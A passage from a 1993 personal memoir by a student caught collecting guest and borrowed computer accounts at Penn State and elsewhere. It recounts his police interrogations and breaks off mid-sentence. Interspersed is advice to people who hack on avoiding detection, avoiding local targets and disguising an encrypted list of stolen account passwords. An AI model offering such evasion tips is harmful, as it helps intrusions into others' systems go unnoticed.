                          An Odyssey of Ignorance

                        (C) 1993 Robert W. F. Clark


[This is a factual account; however, certain innocent parties have
 already suffered enough damage to their reputations
 without further identification.  I have changed their names.
 Where I have done so I follow the name with an asterisk [*].


I.  _In flagrante delicto_

I am writing this article for the benefit of those who have yet to
become acquainted with the brotherhood of law enforcement, a subculture
as warped and depraved as any criminal organization.

The law enforcement community entered my life in the early part of
December 1989.  I am yet to be quit of it.  My initial contact with law
enforcement and its quaint customs was one afternoon as I was reading email.
Suddenly, without warning, I heard a voice shout:  "Freeze, and get away from
the computer."  Nonplussed, but still with some command of my faculties, I
drawled:  "So, which do you want me to do?"

The police officer did not answer.

I was in the main public academic computing facility at Penn State,
which was occupied by several startled-looking computer users, who now trained
their eyes on the ensuing drama with all the solicitous concern of Romans
attending an arena event.

The officer, Police Services Officer Anne Rego, then left the room,
and my immediate concern was to kill all processes and
delete all incriminating files, or at least to arrange an accidental
disruption of power.  However, before I could do anything, Miss Rego
reappeared with a grim, mustached police officer and what appeared to be the
cast of Revenge of the Nerds.

Angela Thomas, computer science instructor, immediately commandeered
both terminals I had been using and began transferring the contents of
all directories to a safe machine; the newcomer, Police Services Officer
Sam Ricciotti, volunteered the helpful information:  "You're in big
trouble, kid."

In an excess of hospitality, they then offered me a ride to Grange
Building, police headquarters of Penn State, for an afternoon of
conversation and bright lights.

I asked if I were under arrest, and finding that I was not, asked
what would happen if I refused their generous offer.  They said that
it might have negative repercussions, and that the wise choice was to
accompany them.

So, after a moment of thought, I agreed to accompany them.  Forming a
strange procession, with a police officer preceding me and another
following, we entered an elevator.  Then, still in formation, we exited
the building to be greeted by two police cars with flashing red and
blue lights.  Like a chauffeur, Officer Ricciotti opened the door for
me, and it was only after he closed it that I realized, for the first
time, that the back doors of police cars have no handles on the inside.

I had made yet another mistake in a long series.

The purpose of this article is to detail several possible mistakes in dealing
with police and how they may be avoided.  As I made almost every possible
mistake, my experience should prove enlightening.

While I hope that this article might prevent you from being busted,
I will have been successful if even one person does not make the
mistakes I made when I was busted.

II.  Prelude

To provide the reader with context, I shall explain the series of events
which culminated in my apprehension.

On my entrance to the Pennsylvania State University as a University
Scholar, the highest distinction available from an institution remarkable for
its lack of distinction, I received an account on PSUVM, an IBM 3090 running
VM/CMS.  Before receiving the account, I acquired all available documentation
from the Information Desk and read it.  As it happened, the first document I
read concerned "Netnews," the local name for Usenet.

As soon as my account was activated, I immediately typed netnews.
I have never been the same since.  Within a week, I began posting
articles of my own and was immediately lambasted, flamed and roasted
to a crisp.  Discovering my own talent in the area of malediction,
I became an alt.flame and talk.bizarre regular.  I also read comp.risks,
comp.dcom.telecom and other technical journals assiduously.

I began hacking VM/CMS, independently discovering a vast
number of flaws in the system.  Within a few months, I was able to
access any information in the system which interested me, submit
anonymous batch jobs, and circumvent the 'ration' utility which limited
a luser's time on the system.  It was a trivial matter to write a trojan
horse which imitated the login screen and grabbed passwords.  Late
at night, when there were few users, I would crank the CPU, of
a system capable of handling 300 users simultaneously,
to 100% capacity just for the sake of doing it.  I discovered a
simple method of crashing the system, but felt no need to do it,
as I knew that it would work.  To avoid disk space rationing, I
would store huge files in my virtual punch.  To my credit, lest
I seem a selfish pig unconcerned with the welfare of
other users, I limited such exercises to the later hours of the
night, and eliminated large files when they were no longer useful
to me.

Like one starved, I glutted myself on information.  To have
legitimate access to such a system was marvellous.  For a few months,
I was satisfied with my level of 'power,' that elusive quality which is
like a drug to those of a certain peculiarity of mind.

However, it was not long before I realized that despite the sheer
power of the system, the user interface was clumsy,
unaesthetic and intolerable to anyone desiring to understand
the machine directly.  The damn thing had a virtual punch
card system!

I had heard about Unix, and was interested in trying this system.  However,
without an affiliation with the Computer Science Department, I had no
way to get Unix access.

Comparative Literature majors apparently should not clutter their heads with
such useless and destructive nonsense as the Unix operating system,
just as an Engineering major can only be damaged by such
mental clutter as the works of Shakespeare; this, in any case, seemed
to be the only justification for such an arcane, Byzantine
policy of restricting access to a nearly unlimited resource.

The academic community is addicted to the unhealthy practice of restricting
information, and its policies are dedicated to the end of turning agile, eager
young minds into so many identical cogs in the social mill.  Those unable or
unwilling to become cogs are of no use to this machine, and are dispensable.

Thus, in the latter part of my freshman year, I became increasingly
frustrated and disillusioned with higher education in general, and
by the very idea of specialized education in particular.  I stopped
attending classes, and even skipped tests.  I became increasingly
nocturnal and increasingly obsessed with Usenet.  Nevertheless, even
by doing the entire semester's work during finals week, I still
barely managed to maintain honors status.

The summer restored my spirits greatly.  I experimented
with LSD for the first time, and found that it allowed me to see
myself as I truly was, and to come to a certain grudging acceptance of
myself, to a greater degree than any psychologist had.  I found that I
preferred marijuana to alcohol, and soon no longer subjected myself to
prolonged bouts of drinking.

However, I mistook my upturn in spirits for a rejuvenation, when
it was more likely due to the lack of pressure and hedonism
of summer.

Near the end of my first year, I met Dale Garrison [*], an
electronic musician and audio man for WPSX-TV, the university
public television station.  He also recorded music recitals
for faculty and visiting luminaries, and thus had access to
the Electronic Music Lab and all its facilities.
His friend Shamir Kamchatka [*] had bequeathed him a Unix
account on the mail hub of the Pennsylvania State University.
Another friend, Ron Gere [*], a systems operator for the
Engineering Computer Lab, had created an account for him on
the departmental VAXcluster following the termination of his
legitimate account due to a change in policy.  They gave the
account the cover name of Huang Chang [*] as a sort of joke,
but this name was remarkably inconspicuous with the preponderance
of Asian names on the system.  Dale began posting articles under
this name, as he had no account with his real name, but by a slow
process, the nom-de-plume became a well-developed and individual
personality, and the poems, articles and diatribes written
under this name became quite popular.  Even when we later
realized the ease with which he could forge articles with his
actual name, he was disinclined to do so.  The wit and
intelligence of the assumed identity became so unique to
that identity that it would have been difficult to shed.

I often used the Unix account, and quickly began to
understand and appreciate the complexity and organic unity
of the Internet.

I had no moral qualms about using a computer account with the
permission of the legitimate owner of the account, any more than
I would have moral qualms about checking out a book from the
mathematics library.  A source of information for which my tuition
and taxes has paid is a source of information which I have every
right to access.  To deny my access is a crime greater by far
than for me to claim my rights by nondestructive means.  Any
university will allow a student of any college to check out a book
on any subject from the library.

However, myopic university administrations seem to believe that restricting
access to information, rather than allowing a free exchange of ideas, is the
purpose of an educational institution.  Every department will have its own
computer subnetwork, regardless of whether it is sensible or equitable to do
so.  The stagnation and redundancy we see on the Internet is the inevitable
result of such an absurd _de facto_ standard.

This policy is by no means limited to computers.  It extends to
class scheduling, work-study programs, any technical equipment worth
using, arts training, religious studies, athletic facilities, degree
requirements, musical instruments, literature and any thing which is
useful to the mind.  Bean-counters who can neither read a line
of Baudelaire nor parse a line of C decide what is to be the canned
curriculum for anyone who chooses a major.  This is the obvious
outcome in a society where education is so undervalued that
Education majors have the lowest SAT scores of any degree-level
students.

So I thought as I saw resources wasted, minds distorted,
the lives of close friends ruined by the slow, inexorable grinding
of the vast, impersonal machine known as higher education.  I saw
professors in computer science tell blatant falsehoods, professors
in philosophy misquote Nietzsche, professors in English Literature
hand out typewritten memos rife with grammatical errors.
I grew entirely disgusted with the mismanagement of higher
education.  When I discovered that the most intelligent and individual
people around me were usually not students, I gave up on college
as a means of self-actualization.

My second year of college was essentially the first repeated,
except that my frustration with the academic world bloomed into
nihilism, and my depression into despair.  I no longer even bothered to
attend most tests, and even skipped finals.  I allowed my paperwork for
the University Scholars Program to lapse, rather than suffer
the indignity of ejection for poor academic performance.

Another summer followed, with less cheer than the previous.  Very early in the
summer, a moron rear-ended my car without even slowing down before slamming
into me.  My mother and stepfather ejected me from their house, and I moved to
Indiana to live with my father.  When the insurance money arrived from my
totalled car, I purchased a cheap vehicle and hit the highway with no
particular destination in mind.  With a lemming's logic, I turned east instead
of west on I-70, and returned to State College, Pennsylvania.

At the last moment, I registered for part-time classes.


III.  History of a Conflagration

>From the beginning of this semester, I neglected my classes, and
instead read RFCs and Unix system security manuals.  I began
experimenting with the communications capabilities of the TCP/IP protocol
suite, and began to understand more deeply how it was that such a network
could exist as an organic whole greater than the sum of its parts.

In the interest of experimenting with these interconnections, I
began to acquire a number of Internet 'guest' accounts.  When possible, I
would use these to expand my area of access, with the goal of testing the
speed and reliability of the network; and, I freely admit, for my amusement.

I realized, at the time, that what I was doing was, legally, in
a gray area; but I did not give moral considerations more than
a passing thought.  Later, I had leisure to ponder the moral and legal aspects
of my actions at great length, but at the time I was collecting accounts I
only considered the technical aspects of what I was doing.

I discovered Richard Stallman's accounts on a variety of computers.
I used these only for testing mail and packet routing.
I realized that it would be trivial to use them for malicious
purposes, but the thought of doing so did not occur to me.  The very
idea of hacking a computer system implies the desire to outsmart the
security some unknown person had designed to prevent intrusion; to
abuse a trust in this manner has all the appeal to a hacker that a
hunter would find in stalking a kitten with a howitzer.  To hack an
open system requires no intelligence and little knowledge, and
imparts no deeper knowledge than is available by legitimate use of
the system.

I soon had a collection of accounts widely scattered around
the continent:  at the University of Chicago, at the Pennsylvania
State University, at Johns Hopkins, at Lawrence-Berkeley Laboratories
and a number of commercial and government sites.

However, the deadly mistake of hacking close to home was my downfall.
I thought I was untouchable and infallible, and in a regrettable accident I
destroyed the /etc/groups file at the Software Engineering Laboratory at Penn
State, due to a serious lapse in judgment combined with a series of
typographical errors.  This is the only action for which I should have been
held accountable; however, as you shall see, it is the only action for which
I was not penalized in any way.

I halt the narrative here to deliver some advice suggested by my
mistakes.

My first piece of advice is:  avoid the destruction of information by not
altering any information beyond that necessary to maintain
access and avoid detection.  Try to protect yourself from typographical
errors by backing up information.  My lack of consideration in this
important regard cost Professor Dhamir Mannai many hours
reconstructing the groups file.  Dhamir plays a major role in the
ensuing fracas, and turned out very sympathetic.  I must
emphasize that the computer security people with whom we have such
fun are often decent people.  Treat a system you have invaded as
you would wish someone to treat your system if they had done the
same to you.  Protect both the system and yourself.  Damage to the system
will have a significant effect on any criminal case which is filed
against you.  Even the harshest of judges is likely to respond to a
criminal case with a bewildered dismissal if no damage is alleged.
However, if there is any damage to a system, the police will most certainly
allege that you maliciously damaged the machine.  It is their job
to do so.

My second piece of advice is:  avoid hacking systems geographically
local to you, even by piggybacking multiple connections across the
country and back to mask your actions.  In any area there is a limited
number of people both capable of and motivated to hack.
When the local security gurus hear that a hacker is on the loose,
they will immediately check their mental list of people who fit the
profile.  They are in an excellent position to monitor their own network.
Expect them to do so.

I now return to my narrative.

Almost simultaneous with my activities, the Computer Emergency Response
Team was formed in the wake of the Morris Worm, and was met with an
almost palpable lack of computer crime worth prosecuting.
They began issuing grimly-worded advisories about the ghastly horrors
lurking about the Internet, and warned of such dangerous events as
the WANK (Worms Against Nuclear Killers) worm,  which displayed
an anti-nuclear message when a user logged on to an infected
machine.

To read the newspaper article concerning Dale and me, a person who
collects guest accounts is, if not Public Enemy Number One, at least
a major felon who can only be thwarted by the combined efforts of
a major university's police division, two computer science departments,
and Air Force Intelligence, which directly funds CERT.

Matt Crawford, at the University of Chicago, notified CERT of my
intrusions into their computer systems.  The slow machinery
of justice began to creak laboriously into motion.  As I had
taken very few precautions, they found me within two weeks.

As it happens, both the Penn State and University of Chicago
systems managers had publicly boasted about the impenetrability of
their systems, and perhaps this contributed to their rancor at discovering
that the nefarious computer criminal they had apprehended was a
Comparative Literature major who had failed his only computer science
course.


IV.  In the Belly of the Beast

When we arrived at the police station, the police left me in a room
alone for approximately half an hour.  My first response was to check
the door of the room.  It was unlocked.  I checked the barred
window, which was locked, but could be an escape if necessary.
Then, with nothing to do, I considered my options.  I considered
getting up and leaving, and saying that I had nothing to discuss
with them.  This was a sensible option at the outset, I thought,
but certainly not sensible now.  This was a repetition of
a mistake; I could have stopped talking to them at any time.

Finally, I assumed the lotus position on the table in order to collect my
thoughts.  When I had almost collected my thoughts, Anne Rego and Sam
Ricciotti returned to the room, accompanied by two men I took to be criminals
at first glance:  a scruffy, corpulent, bearded man I mentally tagged as a
public indecency charge; and a young man with the pale and flaccid ill-health
of a veal calf, perhaps a shoplifter.  However, the pair was Professor Robert
Owens of the computer science department and Daniel Ehrlich, Owens' student
flunky.

Professor Owens sent Ehrlich out of the room on some trivial
errand.  Ricciotti began the grilling.  First, he requested
that I sign a document waiving my Miranda rights.  He explained that it
was as much for my benefit as for theirs.  I laughed out loud.  However,
I thought that as I had done nothing wrong, I should have no fear of
talking to them, and I signed the fatal document.

I assumed that what I was going to say would be taken at
face value, and that my innocence was invulnerable armor.
Certainly I had made a mistake, but this could be explained, could it
not?  Despite my avowed radical politics, my fear of authority was
surpassed by a trust for apparent sincerity.

As they say, a con's the easiest mark there is.

I readily admitted to collecting guest accounts, as I found nothing
culpable in using a guest account, my reasoning being that if a public
building had not only been unlocked, but also a door in that
building had been clearly marked as for a "Guest," and that door opened
readily, then no one would have the gall to arrest someone for trespass, even
if other, untouched parts of the building were marked
"No Visitors."  Using a 'guest' account is no more computer crime than
using a restroom in a McDonald's is breaking-and-entering.

Ricciotti continued grilling me, and I gave him further information.
I fell prey to the temptation to explain to him what he clearly did
not understand.  If you are ever in a similar circumstance, do not do
so.  The opaque ignorance of a police officer is, like a well-
constructed security system, a very tempting challenge to a hacker.
However, unlike the security system, the ignorance of a police
officer is uncrackable.

If you attempt to explain the Internet to a police officer investigating
you for a crime, and the notion of leased WATS lines seems
a simple place to start, it will be seen as evidence of some vast,
bizarre conspiracy.  The gleam in the cop's eye is not one of
comprehension; it is merely the external evidence that a power fantasy
is running in the cop's brain.  "I," the cop thinks, "will definitely be
Cop of the Year!  I'm going to find out more about this Internet thing
and bust the people responsible."

Perhaps you will be lucky or unlucky enough to be busted by a cop
who has some understanding of technical issues.  Never having been
busted by a computer-literate cop, I have no opinion as to whether
this would be preferable.  However, having met more cops than I care to
remember, I can tell you that the chances are slim that you will meet a cop
capable of tying shoelaces in the morning.  The chances of meeting a cop
capable of understanding the Internet are nearly nonexistent.

Apparently, this is changing, but by no means as rapidly
as the volatile telecommunications scene.  At present, the cop who busts
you might have a Mac hooked up to NCIC and be able to use it clumsily;
or may be able to cope with the user interface of a BBS, but don't
bother trying to explain anything if the cop doesn't understand you.

If the cop understands you, you have no need to explain; if not, you
are wasting your time.  In either case, you are giving the police the
rope they need to hang you.

You have nothing to gain by talking to the police.  If you are not under
arrest, they can do nothing to you if you refuse to speak to them.  If you
must speak to them, insist on having an attorney present.  As edifying as it
is to get a first-hand glimpse of the entrenched ignorance of the law-
enforcement community, this is one area of knowledge where book-learning is
far preferable to hands-on experience.  Trust me on this one.

If you do hack, do not use your personal computing equipment and
do not do it from your home.  To do so is to invite them to confiscate every
electronic item in your house from your telephone to your microwave.  Expert
witnesses are willing to testify that anything taken could be used for illegal
purposes, and they will be correct.

Regardless of what they may say, police have no authority to offer
you anything for your cooperation; they have the power to tell the
magistrate and judge that you cooperated.  This and fifty cents will
get you a cup of coffee.

Eventually, the session turned into an informal debate with Professor
Owens, who showed an uncanny facility for specious argument and
proof by rephrasing and repeating.  The usual argument ensued,
and I will encapsulate rather than include it in its entirety.

"If a bike wasn't locked up, would that mean it was right to steal it or
take it for a joyride?"

"That argument would hold if a computer were a bike; and if the bike
weren't returned when I was done with it; and if, in fact, the bike
hadn't been in the same damn place the whole time you assert it was
stolen."

"How do you justify stealing the private information of others?"

"For one thing, I didn't look at anyone's private information.
In addition, I find the idea of stealing information so grotesque
as to be absurd.  By the way, how do you justify working for Penn State, an
institution that condoned the illegal sale of the Social Security
Numbers of its students?"

"Do you realize what you did is a crime?"  interjected Ricciotti.

"No, I do not, and after reading this law you've shown me, I still
do not believe that what I did violates this law.  Beyond that, what
happened to presumed innocent until proven guilty?"

The discussion continued in a predictable vein for about two hours,
when we adjourned until the next day.  Sam sternly advised me that as
this was a criminal investigation in progress, I was not to tell
anyone anything about it.  So, naturally, I immediately told
everyone I knew everything I knew about it.

With a rapidly mounting paranoia, I left the grim, cheerless
interrogation room and walked into the bustle of an autumn day
at Penn State, feeling strangely separate from the crowd around
me, as if I had been branded with a scarlet 'H.'

I took a circuitous route, often doubling back on myself, to detect
tails, and when I was sure I wasn't being followed, I headed straight
for a phone booth to call the Electronic Music Lab.

The phone on the other end was busy.  This could only mean one thing,
that Dale was online.  His only crime was that he borrowed an
account from the legitimate user, and used the Huang account
at the Engineering Computer Lab, but I realized after my discussion
with the police that they would certainly not see the matter as
I did.

I realized that the situation had the possibility to erupt into
a very ugly legal melee.  Even before Operation Sun-Devil, I realized
that cops have a fondness for tagging anything a conspiracy
if they feel it will garner headlines.  I rushed to the Lab.


V.  A Desperate Conference

"Get off the computer now!  I've been busted!"

"This had better not be a goddamn joke."

He rapidly disconnected from his session and turned off the computer.
We began to weigh options.  We tried to figure out the worst thing they
could do to me.  Shortly, we had a list of possibilities.  The police
could jail me, which seemed unlikely.  The police could simply forget
about the whole thing, which seemed very unlikely.  Anything between
those two poles was possible.  Anything could happen, and as I was
to find, anything would.  We planned believing that it was only
I who was in jeopardy.

If you are ever busted, you will witness the remarkable migration
habits of the fair-weather friend.  People who yesterday had
nothing better to do than sit around and drink your wine will
suddenly have pressing duties elsewhere.

If you are lucky, perhaps half a dozen people will consent to speak
to you.  If you are very lucky, three of them will be willing to be
seen with you in public.

Very shortly the police would begin going after everyone I knew for no other
reason than that they knew me.  I was very soon to be given yet another of the
blessings accorded to those in whom the authorities develop an interest.

I would discover my true friends.

I needed them.


VI.  The Second Interrogation

I agreed to come in for a second interview.

At this interview, I was greeted by two new cops.  The first cop,
with the face of an unsuccessful pugilist, was Jeffery Jones.
I detested him on sight.

The second, older cop, with brown hair and a mustache, was Wayne
Weaver, and had an affable, but stern demeanor, somewhat reminiscent
of a police officer in a fifties family sitcom.

As witness to this drama, a battered tape recorder sat between us
on the wooden table.  In my blithe naivete, I once again waived
my Miranda rights, this time on tape.

The interview began with a deranged series of accusations by Jeffery
Jones, in which were combined impossibilities, implausibilities,
inaccuracies and incongruities.  He accused me of everything
from international espionage to electronic funds transfer.  Shortly
he exhausted his vocabulary with a particularly difficult
two-syllable word and lapsed into silence.

Wayne filled the silence with a soft-spoken inquiry, seemingly
irrelevant to the preceding harangue.  I answered, and we began
a more sane dialogue.

Jeffery Jones remained mostly silent.  He twiddled his thumbs, studied
the intricacies of his watch, and investigated the gum stuck under the table.
Occasionally he would respond to a factual statement by rapidly turning,
pounding the table with his fists and shouting:  "We know you're lying!"

Finally, after one of Jeffery's outbursts, I offered to terminate the
interview if this silliness were to continue.  After a brief consultation
with Wayne, we reached an agreement of sorts and Jeff returned to a dumb,
stony silence.

I was convinced that Wayne and Jeff were pulling the good cop/bad cop
routine, having seen the mandatory five thousand hours of cop shows the
Nielsen people attribute to the average American.  This was, I thought,
standard Mutt and Jeff.  I was to change my opinion.  This was not good
cop/bad cop.  It was smart cop/dumb cop.  And, more frighteningly, it
was no act.

After some more or less idle banter, and a repetition of my previous
story, and a repetition of my refusal to answer certain other questions,
the interrogation began to turn ugly.

Frustrated by my refusal to answer, he suddenly announced that he knew
I was involved in a conspiracy, and made an offer to go easy on me if
I would tell him who else was involved in the conspiracy.

I refused point-blank, and said that it was despicable of him to
request that I do any such thing.  He began to apply pressure and
I will provide a reconstruction of the conversation.  As the police
have refused all requests by me to receive transcripts of interviews,
evidence and information regarding the case, I am forced to rely on
memory.

"These people are criminals.  You'd be doing the country a service
by giving us their names."

"What people are criminals?  I don't know any criminals."

"Don't give me that.  We just want their names.  We won't do
anything except ask them for information."

"Yeah, sure.  Like I said, I don't know any criminals.  I'm not a criminal,
and I won't turn in anyone for your little witch-hunt, because I don't
know any criminals, and I'd be lying if I gave you any names."

"You're not going to protect anyone.  We'll get them anyway."

"If you're going to get them, you don't need my help."

"We won't tell anyone that you told them about us."

"Fuck that.  I'll know I did it.  How does that affect the morality
of it, anyway?"

Dropping the moral argument, he went to the emotional argument:

"If you help us, we'll help you.  When you won't help us, you
stand alone.  Those people don't care about you, anyway."

"What people?  I don't know any people."

"Just people who could help us with our investigation.  It doesn't
mean that they're criminals."

"I don't know anything about any criminals I said."

"In fact, one of your friends turned you in.  Why should you take
this high moral ground when you're a criminal anyway, and they'd
do the same thing to you if they were in the situation you're in.
You just have us now, and if you won't stand with us, you stand
alone."

"I don't have any names.  And no one I knew turned me in."

This tactic, transparent as it was, instilled a worm of doubt in my mind.
That was its purpose.

This is the purpose of any of the blandishments, threats and lies
that the police will tell you in order to get names from you.  They
will attempt to make it appear as if you will not be harming the
people you tell them about.  Having been told that hackers are just
adolescent pranksters who will crack like eggs at the slightest
pressure and cough up a speech of tearful remorse and hundreds of
names, they will be astonished at your failure to give them names.

I will here insert a statement of ethics, rather than the merely
practical advice which I have heretofore given.  If you crack at the
slightest pressure, don't even bother playing cyberpunk.  If
your shiny new gadget with a Motorola 68040 chip and gee-whiz
lightning Weitek math co-processor is more important to you than
the lives of your friends, and you'd turn in your own grandmother
rather than have it confiscated, please fuck off.  The computer underground
does not need you and your lame calling-card and access code rip-offs.
Grow up and get a job at IBM doing the same thing a million
other people just like you are doing, buy the same car a million
other people just like you have, and go to live in the same suburb
that a million other people like you call home, and die quietly at
an old age in Florida.  Don't go down squealing like a pig,
deliberately and knowingly taking everyone you know with you.

If you run the thought-experiment of imagining yourself in this
situation, and wondering what you would do, and this description
seems very much like what meets you in the bathroom mirror, please
stop hacking now.

However, if you feel you must turn someone in to satisfy the cops,
I can only give the advice William S. Burroughs gives in _Junky_
to those in a similar situation:  give them names they already have, without
any accompanying information; give them the names of people who have left the
country permanently.  Be warned, however, that giving false information to the
police is a crime; stick to true, but entirely useless information.

Now, for those who do not swallow the moral argument for not finking,
I offer a practical argument.  If you tell the police about
others you know who have committed crimes, you have admitted
your association with criminals, bolstering their case
against you.  You have also added an additional charge against
yourself, that of conspiracy.  You have fucked over the very
friends you will sorely need for support in the near future,
because the investigation will drag on for months, leaving your life
in a shambles.  You will need friends, and if you have sent
them all up the river, you will have none.  Worse, you will
deserve it.  You have confessed to the very crimes you
are denying, making it difficult for you to stop giving them
names if you have second thoughts.  They have the goods on you.

In addition, any offers they make if you will give them names are legally
invalid and non-binding.  They can't do jack-shit for you and wouldn't if they
could.  The cop mind is still a human mind, and there is nothing more
despicable to the human mind than a traitor.

Do not allow yourself to become something that you can not tolerate being.
Like Judas, the traitor commits suicide both figuratively and literally.

I now retire from the soapbox and return to the confessional.

My motives were pure and my conscience was clean.  With a sense
of self-righteousness unbecoming in a person my age, I assumed that
my integrity was invulnerability, and that my refusal to give them
any names was going to prevent them from fucking over my friends.

I had neglected to protect my email.  I had not encrypted my
communications.  I had not carefully deleted any incriminating
information from my disks, and because of this I am as guilty
as the people who blithely rat out their friends.  I damaged
the lives of a number of people by my carelessness, a number of
people who had more at stake than I had, and all my good intentions
were not worth a damn.  I had one encrypted file, that a list
of compromised systems and account names, and that was DES encrypted
with a six-character alphanumeric.

As I revelled in my self-righteousness, Dan Ehrlich and Robert Owens
arrived with a two-foot high pile of hardcopy on which was printed
every file on my PSUVM accounts, including at least a year of email
and all my posts to the net, including those in groups such as
alt.drugs, and articles by other people.

Wayne assumed that any item on the list, even saved posts from other
people, was something that had been sent to me personally by its
author, and that these people were, thus, involved in some vast conspiracy.
While keeping the printed email out of my sight, he began listing
names and asking me for information about that person.  I answered,
for every person, that I knew nothing about that person except what
they knew.  He asked such questions as "What is Emily Postnews'
real name, and how is she involved in the conspiracy?"

Ehrlich and Owens had conveniently disappeared, so I couldn't expect them to
explain the situation to Wayne; and had, myself, given up any attempt to
explain, realizing that anything I said would simply reinforce the cops'
paranoid conspiracy theories.  By then, I was refusing to answer practically
every question put to me, and finally realized I was outgunned.  When I had
arrived, I was puffed up with bravado and certain that I could talk my way out
of this awful situation.  Having made rather a hash of it as a hacker, I
resorted to my old standby, my tongue, with which I had been able
to escape any previous situation.  However, not only had I not talked
my way out of being busted, I had talked my way further into it.

If you believe, from years of experience at social engineering,
that you will be able to talk your way out of being busted, I wish
you luck; but don't expect it to happen.  If you talk with the police, and
you are not under arrest at the time, expect that one or two of
your sentences will be able to be taken out of context and used
as a justification for issuing an arrest warrant.  If you talk with
the police and you are under arrest, the Miranda statement:  "Anything
you say can and will be held against you in a court of law," is perhaps
the only true statement in that litany of lies.

In any case, my bravado had collapsed.  I still pointedly
called the cops "Wayne" and "Jeff," but otherwise, resorted to
repeating mechanically that I knew nothing about nothing.

Owens and Ehrlich returned, and announced that they had discovered
an encrypted file on my account, called holy.nodes.  I bitterly regretted
the flippant name, and the arrogance of keeping such a file.

If you must have an encrypted list of passwords and accounts
sitting around, at least give it a name that makes it seem like some
sort of executable, so that you have plausible deniability.

They assured me that they could decrypt it within six hours on a
Cray Y-MP to which they had access.  I knew that the Computer Science
Department had access to a Cray at the John von Neuman Computer Center.
I made a brief attempt to calculate the rate of brute-force password
cracking on a Cray and couldn't do it in my head.  However, as
the password was only six alphanumeric characters, I realized that it
was quite possible that it could be cracked.  I believe now that
I should have called their bluff, but I gave them the key, yet another
in a series of stupid moves.

Shortly, they had a list of computer sites, accounts and passwords,
and Wayne began grilling me on those.  Owens was livid when he noted
that a machine at Lawrence-Berkeley Labs, shasta.lbl.gov, was in the
list.  This was when my trouble started.

You might recall that Lawrence-Berkeley Labs figures prominently in
Clifford Stoll's book _The Cuckoo's Egg_.  The Chaos Computer
Club had cracked a site there in the mistaken belief that it was Lawrence-
Livermore.  As it happens, I had merely noticed a guest account there,
logged in and done nothing further.  Of course, this was too
simple an explanation for a cop to believe it.

Owens had given the police a tiny bit of evidence to support the
bizarre structure of conspiracy theories they had built; and a paranoid
delusion, once validated in even the most inconsequential manner, becomes
unshakably firm.

Wayne returned to the interrogation with renewed vigor.  I continued
giving answers to the effect that I knew nothing.  He came to the name of
Raymond Gary [*], who had generously allowed me to use an old account on
PSUVM, that of a friend of his who had left the area.  I attempted to assure
them of his innocence.  This was another bad move.

It was a bad move because this immediately reinforces the conspiracy
theory, and the cops wish to have more information on that
person.  I obfuscated, and returned to the habit of repeating:  "Not to
the best of my recollection," as if I were in the Watergate hearings.

Another name surfaced, that of a person who had allowed me to use his
account because our respective machines could not manage a tolerable
talk connection.  This person, without his knowledge, joined the
conspiracy.  Once again, I foolishly tried to explain the situation.
This simply made it worse, as the cop did not understand a word
I was saying; and Owens was incapable of appreciating the difference
between violating the letter of the law and the spirit of the law.

Wayne repeatedly asked about my overseas friends, informed me that he knew
there were foreign governments involved, again told me that a friend of mine
had informed on me.  I was told lies so outrageous that I hesitate to put them
on paper.  I denied everything.

I made another lengthy attempt at explanation, trying to defuse the conspiracy
theory, and gave a speech on the difference between breaking into someone's
house and ripping off everything there, voyeuristically spying on people, and
temporarily borrowing an account simply to talk to someone because a network
link was not working.  I made an analogy between this and asking
someone who is driving a corporate vehicle to give a jump to a
disabled vehicle, and tried to explain that this was certainly not
the same as if the authorized user of the corporate vehicle had simply
handed a passerby the keys.  I again attempted to explain the Internet, leased
lines, the difference between FTP and mail, why everyone on the Internet
allowed anyone else to transfer files from, to and through their machines, and
once again failed to explain anything.

Directly following this tirade, delivered almost at a shout, Wayne
leaned over the desk and asked me:  "Who's Bubba?"

This was too much to tolerate.  My ability to take the situation
seriously, already very shaky, simply vanished in the face of
this absurdity.  I lost it entirely.  I laughed hysterically.

I asked, my anger finally getting the better of my amusement:  "What the
fuck kind of question is that?"

He repeated the question, not appreciating the humor inherent in
this absurd contretemps; I was beyond trying to maintain the appearance
of solemnity.  Everything, the battered table, the primitive
tape recorder, the stony-faced cops, the overweight computer security
guys, seemed entirely empty of meaning.  I could no longer accept as real that
I was in this dim room with a person asking me the question:  "Who's Bubba?"

I said:  "I have no idea.  You tell me."

Finally, Wayne came to Dale's name.  Dale did not use his last name
in any of the email he had sent to me, and I hoped that his name
was not in any file on any machine anywhere.  I recovered some of
my equilibrium, and refused to answer.

A number of references to "lab supplies" were made in the email, and
I was questioned as to the meaning of this phrase.  I answered that
it simply meant quarter-inch reels of tape for music.  They refused
to accept this explanation, and accused me of running a drug ring over
the computer network.

Veiled threats, repetitions of the question, rephrasings of it,
assurances that they were going to get everyone anyway, and similar
cop routines followed.

Finally, having had altogether too much of this nonsense, I
said:  "This interview's over.  I'm leaving."  As simply as that,
and as quickly, I got up and left.  I wish I could say that I did
not look back, but I did glance over my shoulder as I left.

"We'll be in touch," said Wayne.

"Yeah, sure," I said.


VII.  Thirty Pieces of Silver

I informed Dale of the ominous turn in the investigation, and
told him that the cops were now looking for him.  From a sort of fatalistic
curiosity, we logged into Shamir's account to watch the activities
of the computer security guys, and to confer with some of their
associates to find out what their motivations might be.  We had
decided that the possibility of a wiretap was slim, and that if
there were a wiretap, we were doomed anyway, so what the hell?

There is no conclusive evidence that there was a wiretap, but
the police would not have needed a warrant to tap university
phones, as they are on a private branch exchange, which does
not qualify for legal protection.  In addition, one bit of
circumstantial evidence strikes me as indicative of the possibility
of a wiretap, that being that when Dale called Shamir to explain
the situation, and left a message in his voice mail box, the
message directly following Dale's was from Wayne.

We frequented the library, researching every book dealing with the subject of
computer crime, reading the Pennsylvania State Criminal Code, photocopying and
transcribing important texts, and compiling a disk of information relevant to
the case, including any information that someone "on the outside" would need
to know if we were jailed.

I badly sprained my ankle in this period, but walked on it for three
miles, and it was not until later in the night that I even realized
there was anything wrong with it, so preoccupied was I by the bizarre
situation in which I was embroiled.  In addition, an ice storm developed,
leaving a thin layer of ice over sidewalks, roads and the skeletal
trees and bushes.  I must have seemed a ridiculous figure hobbling
across the ice on a cane, looking over my shoulder every few seconds;
and attempting to appear casual whenever a police car passed.

It seemed that wherever I went, there was a police car which slowed
to my pace, and it always seemed that people were watching me.  I
tried to convince myself that this was paranoia, that not everyone
could be following me, but the feeling continued to intensify, and
I realized that I had adopted the mentality of the cops,
that we were, essentially, part of the same societal process; symbiotic
and necessary to each other's existence.  The term 'paranoia' had no
meaning when applied to this situation; as there were, indeed, people
out to get me; people who were equally convinced that I was out to
get them.

I resolved to accept the situation, and abide by its unspoken rules.
As vast as the texts are which support the law, there is another
